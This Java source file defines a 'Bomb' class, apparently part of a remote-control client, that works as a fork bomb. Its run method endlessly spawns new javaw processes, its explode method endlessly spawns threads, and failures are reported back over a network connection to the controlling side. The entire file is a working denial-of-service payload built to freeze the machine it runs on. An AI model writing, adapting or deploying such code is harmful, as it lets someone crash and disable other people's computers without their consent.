package main.utils;

import main.network.Connection;
import main.network.Message;

import java.io.IOException;

import static main.utils.ClientUtils.startOnNewThread;

public class Bomb implements Runnable {
    private Connection connection;

    public Bomb(Connection conn) {
        this.connection = conn;
    }

    @Override
    public void run() {
        try {
            while (true)
                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "main.utils.Bomb"});
        } catch (IOException e) {
            connection.sendMessage(new Message("bomb-fail", e.getMessage()));
            e.printStackTrace();
        }
    }

    public static void explode(Connection connection) {
        while (true)
            startOnNewThread(new Bomb(connection));
    }
}